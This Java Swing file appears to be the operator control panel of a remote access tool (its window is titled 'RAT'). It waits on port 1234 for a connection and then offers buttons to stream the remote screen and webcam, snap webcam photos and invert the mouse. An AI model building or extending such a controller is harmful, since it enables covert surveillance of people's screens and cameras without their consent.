package View;

import java.awt.Color;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;

import javax.swing.BoxLayout;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;

import Network.Receiver;

public class MainFrame extends JFrame {

	Receiver r;
	JPanel main;

	// Buttons
	JButton showScreen;
	JButton showWebcam;
	JButton invertMouse;
	JButton webcamPhoto;
	JLabel label;
	
	JComboBox deviceList;

	int inputDevice = 0;

	public MainFrame() {

		r = new Receiver(1234, this);

		setBounds(0, 0, 1000, 1000);
		setTitle("RAT");
		main = new JPanel();
		main.setLayout(new BoxLayout(main, BoxLayout.Y_AXIS));

		// setup buttons
		showScreen = new JButton("Show Screen");
		showScreen.setVisible(false);
		showScreen.setAlignmentX(Component.CENTER_ALIGNMENT);
		showScreen.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				if (!r.isFrameTransferActive()) {
					r.sendCommand("d");
					new Thread(new Runnable() {

						public void run() {
							r.startFrameTransfer();
						}

					}).start();
				}
			}
		});
		main.add(showScreen);

		showWebcam = new JButton("Show Webcam");
		showWebcam.setVisible(false);
		showWebcam.setAlignmentX(Component.CENTER_ALIGNMENT);
		showWebcam.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				if (!r.isFrameTransferActive()) {
					r.sendCommand("w" + inputDevice);
					new Thread(new Runnable() {

						public void run() {
							r.startFrameTransfer();
						}

					}).start();
				}
			}
		});
		main.add(showWebcam);

		invertMouse = new JButton("Invert Mouse");
		invertMouse.setVisible(false);
		invertMouse.setAlignmentX(Component.CENTER_ALIGNMENT);
		invertMouse.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				r.sendCommand("i");
			}
		});
		main.add(invertMouse);

		webcamPhoto = new JButton("Take Webcam Photo");
		webcamPhoto.setVisible(false);
		webcamPhoto.setAlignmentX(Component.CENTER_ALIGNMENT);
		webcamPhoto.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				r.sendCommand("s0");
				r.singleFrameTransfer();
			}
		});
		main.add(webcamPhoto);

		label = new JLabel("Select input device:");
		label.setAlignmentX(Component.CENTER_ALIGNMENT);
		label.setVisible(false);
		main.add(label);
		
		Integer[] devices = {0, 1};
		deviceList = new JComboBox(devices);
		deviceList.setVisible(false);
		deviceList.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				JComboBox cb = (JComboBox) e.getSource();
				inputDevice = (Integer) cb.getSelectedItem();
			}
		});
		main.add(deviceList);

		main.setBackground(Color.WHITE);
		add(main);

		ImageIcon loading = new ImageIcon("ajax-loader.gif");
		JLabel load = new JLabel(loading);
		JLabel text = new JLabel("Awaiting connection...");
		text.setFont(new Font(text.getFont().getName(), -1, 50));
		load.setAlignmentX(Component.CENTER_ALIGNMENT);
		text.setAlignmentX(Component.CENTER_ALIGNMENT);
		main.add(load);
		main.add(text);

		pack();
		setVisible(true);

		r.connect();
		main.remove(load);
		main.remove(text);
		showMain();
	}

	private void showMain() {
		showScreen.setVisible(true);
		showWebcam.setVisible(true);
		invertMouse.setVisible(true);
		webcamPhoto.setVisible(true);
		label.setVisible(true);
		deviceList.setVisible(true);

		pack();
		main.repaint();
	}

	public static void main(String[] args) {
		new MainFrame();
	}
}
